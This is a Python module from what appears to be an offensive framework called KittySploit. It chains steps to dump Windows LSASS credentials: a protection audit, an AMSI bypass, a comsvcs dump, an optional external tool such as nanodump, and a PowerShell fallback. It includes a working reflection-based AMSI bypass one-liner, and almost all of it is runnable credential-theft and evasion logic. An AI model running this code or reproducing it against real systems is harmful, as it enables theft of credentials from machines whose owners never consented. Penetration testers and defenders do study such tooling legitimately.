#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Orchestrate LSASS credential extraction: protection audit, optional AMSI bypass,
comsvcs dump, optional external tool, then PowerShell fallback.
"""

from kittysploit import *
import importlib
import os

from lib.post.windows.session import WindowsSessionMixin

_AMSI_PROBE = "'amsiutils' + 'amsicontext'"
_AMSI_INIT_FAILED = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
)

_CHILD_MODULES = {
    "audit": "modules.post.shell.windows.gather.runasppl_audit",
    "comsvcs": "modules.post.shell.windows.gather.dump_lsass_comsvcs",
    "ps_dump": "modules.post.shell.windows.gather.dump_lsass",
    "external": "modules.post.shell.windows.manage.external_tool_runner",
    "amsi": "modules.post.shell.windows.manage.amsi_bypass",
}


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows LSASS Dump Chain",
        "description": (
            "Run RunAsPPL audit, optional AMSI bypass, then attempt LSASS dump via "
            "comsvcs, external operator tool, and PowerShell MiniDump fallback."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1003/001/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 10,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 2.0,
            "noise": 0.9,
            "value": 1.3,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": [{"capability": "db_access", "from_detail": "lsass_dump"}],
            },
        },
    }

    run_audit = OptBool(True, "Run RunAsPPL / Credential Guard audit first", False)
    bypass_amsi = OptBool(True, "Attempt AMSI bypass when probe looks blocked", False)
    use_external_tool = OptBool(False, "Try external_tool_runner before PS fallback", False)
    external_tool = OptFile("", "Local tool for external dump (e.g. nanodump.exe)", False)
    external_args = OptString("", "Arguments for external tool", False)
    external_output = OptString("", "Remote output path to pull after external tool", False)
    fallback_ps_dump = OptBool(True, "Fall back to gather/dump_lsass if comsvcs fails", False)

    def _session_value(self) -> str:
        return str(self.session_id.value if hasattr(self.session_id, "value") else self.session_id)

    def _load_child(self, import_path: str):
        mod = importlib.import_module(import_path)
        cls = getattr(mod, "Module", None)
        if not cls:
            raise ProcedureError(FailureType.Unknown, f"No Module class in {import_path}")
        child = cls()
        child.framework = self.framework
        child.set_option("session_id", self._session_value())
        return child

    def _run_child(self, key: str, **options) -> bool:
        import_path = _CHILD_MODULES[key]
        print_status(f"Chain step: {key} ({import_path})")
        child = self._load_child(import_path)
        for name, value in options.items():
            child.set_option(name, value)
        try:
            result = child.run()
            return bool(result) if result is not None else True
        except ProcedureError as exc:
            print_warning(f"{key} failed: {exc}")
            return False
        except Exception as exc:
            print_warning(f"{key} error: {exc}")
            return False

    def _amsi_blocked(self) -> bool:
        out = self.win_run_powershell(_AMSI_PROBE, timeout=10)
        return not (out or "").strip()

    def _runas_ppl_enabled(self) -> bool:
        out = self.win_execute(
            r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL',
            timeout=8,
        )
        return bool(out) and ("0x1" in out.replace(" ", "") or "REG_DWORD" in out and "0x1" in out)

    def check(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False
        if not self.win_is_admin():
            print_error("Administrator privileges are required.")
            return False
        lsass = self.win_run_powershell(
            "if (Get-Process -Name lsass -ErrorAction SilentlyContinue) { '1' } else { '0' }",
            timeout=8,
        )
        if "1" not in lsass:
            print_error("LSASS process not found.")
            return False
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotAccess, "LSASS dump chain prerequisites not met")

        if self.run_audit:
            self._run_child("audit")

        if self.bypass_amsi and self._amsi_blocked():
            print_status("AMSI probe empty — attempting bypass...")
            if not self._run_child("amsi"):
                print_warning("AMSI bypass step failed; continuing anyway.")
        elif self.bypass_amsi:
            self.win_run_powershell(_AMSI_INIT_FAILED, timeout=10)

        if self._run_child("comsvcs", bypass_amsi=False):
            print_success("LSASS dump chain succeeded via comsvcs.")
            return True
        print_warning("comsvcs dump failed — trying next steps.")

        if self.use_external_tool:
            tool = self.external_tool
            if isinstance(tool, list):
                tool = tool[0] if tool else ""
            tool_path = str(tool or "").strip()
            if not tool_path or not os.path.isfile(tool_path):
                print_warning("external_tool not set or missing — skipping external step.")
            else:
                opts = {
                    "local_file": tool_path,
                    "arguments": str(self.external_args or ""),
                    "remote_output": str(self.external_output or ""),
                }
                if self._run_child("external", **opts):
                    print_success("LSASS dump chain succeeded via external tool.")
                    return True
                print_warning("External tool step failed.")
        elif self._runas_ppl_enabled():
            print_info(
                "RunAsPPL detected — consider: "
                "set use_external_tool true + external_tool (PPLdump/nanodump)."
            )

        if self.fallback_ps_dump:
            if self._run_child("ps_dump"):
                print_success("LSASS dump chain succeeded via PowerShell fallback.")
                return True
            print_error("PowerShell LSASS dump fallback failed.")

        raise ProcedureError(FailureType.Unknown, "LSASS dump chain exhausted all enabled steps")
